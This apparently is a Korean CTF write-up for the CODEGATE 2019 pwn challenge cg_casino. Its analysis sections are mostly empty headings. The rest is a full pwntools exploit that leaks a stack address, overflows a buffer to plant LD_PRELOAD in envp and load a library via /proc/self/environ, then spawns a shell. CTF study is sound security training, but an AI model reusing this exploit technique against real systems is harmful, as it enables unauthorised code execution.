---
title: "[HS2024] [CODEGATE 2019] cg_casino Write-up"
date: 2024-07-31 18:00:00 +0900
categories: [WRITE-UP, PWN]
tags: [hs2024, codegate, ctf, pwn, environ, envp]     # TAG names should always be lowercase
---

# cg_casino

2019 Codegate 예선 문제인 cg_casino 문제 write-up.

## 1. Environment
- Ubuntu 16.04
- GLIBC: 2.23
```shell
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

## 2. 바이너리 분석

전반적인 바이너리 동작에 대한 분석.

### 2.1. main
서버에 접속하면, 총 6개의 메뉴가 주어지고, 

### 2.1. init

## 3. 취약점 분석

발견한 취약점들에 대한 분석

### 3.1. Stack Buffer Overflow

### 3.2. Stack Leak

## 4. Exploit 전략

Exploit을 하기 위한 전략.

bof로 

## 5. Result

exploit을 수행한 결과 아래와 같이 shell을 획득할 수 있다.

![Exploit success](/assets/img/posts/HS2024-1/cg_casino/exploit_success.png)

### Full exploit code
```python
import subprocess

from pwn import *


context.log_level = 'WARNING'
binary = 'cg_casino'

HOST, PORT = '127.0.0.1 6677'.split(' ')

def put_voucher(voucher: bytes):
    info(p.recvuntil(b'6) exit'))
    p.sendline(b'1')
    info(p.recvuntil(b'voucher :'))
    p.sendline(voucher)

def merge_voucher(old_voucher: bytes):
    info(p.recvuntil(b'6) exit'))
    p.sendline(b'2')
    info(p.recvuntil(b'voucher :'))
    p.sendline(old_voucher)

def lotto(numbers: list, leak=False):
    info(p.recvuntil(b'6) exit'))
    p.sendline(b'3')
    info(p.recvuntil(b'|  |  |  |  |  |  |\n===================\n'))
    if not leak:
        for number in numbers:
            p.sendline(number)
    else:
        p.sendline(b'A')
        p.sendline(b'A')
        p.sendline(b'A')
        line = p.recvline()
        leaked = int(line.split()[0])
        for number in numbers:
            p.sendline(number)
        return leaked

def slot_machine():
    info(p.recvuntil(b'6) exit'))
    p.sendline(b'5')
    p.sendafter(b'press any key', b'\n')

if __name__ == '__main__':
    while True:
        try:
            p = remote(HOST, PORT)

            lotto([b'1', b'2', b'3', b'4', b'5', b'6'])
            leaked = lotto([b'3', b'4', b'5', b'6'], leak=True)

            # Probably the address of the stack
            leaked += 0x7ffc00000000
            warning(f'leaked: {hex(leaked)}')

            addr_diff = leaked - 0x7fffffffdf10
            envp = 0x7fffffffe0a8 + addr_diff
            new_name = 0x7fffffffdf50 + addr_diff

            # Probably2 the address of environ
            environ = (envp & 0xfffffffff000) + 0x2276

            warning(f'envp: {hex(envp)}')
            warning(f'environ: {hex(environ)}')
            warning(f'new_name: {hex(new_name)}')

            with open('libfile/tputs.so', 'rb') as f:
                file_data = f.read().replace(b'\x0a', b'\x01')
            info(len(file_data))

            LD_PRELOAD = b'LD_PRELOAD=/home/cg_casino/voucher/mylib.so\x00'
            TERM = b'TERM=xterm-256color\x00'

            payload = b'mylib.so\x00'
            payload = payload.ljust(0x100, b'A')
            payload += LD_PRELOAD                   # new_name+0x100
            payload += TERM                         # new_name+0x100+len(payload)
            payload = payload.ljust(envp - new_name, b'A')
            payload += p64(new_name + 0x100)                # envp[0] = ld_preload
            payload += p64(new_name+0x100+len(LD_PRELOAD))  # envp[1] = term
            payload += p64(0)                               # envp[2] = NULL
            payload = payload.ljust(environ - new_name, b'A')
            payload += file_data
            payload += p64(0)
            
            put_voucher(payload)
            
            merge_voucher(b'/proc/self/environ'.rjust(0x20, b'/'))
        except:
            p.close()
            continue
        slot_machine()
        p.sendline(b'ls /home/cg_casino/')
        line = p.recvline()
        line = p.recvline()
        if b'cg_casino' in line:
            warning("Success!")
            break
        p.close()
    p.interactive()
```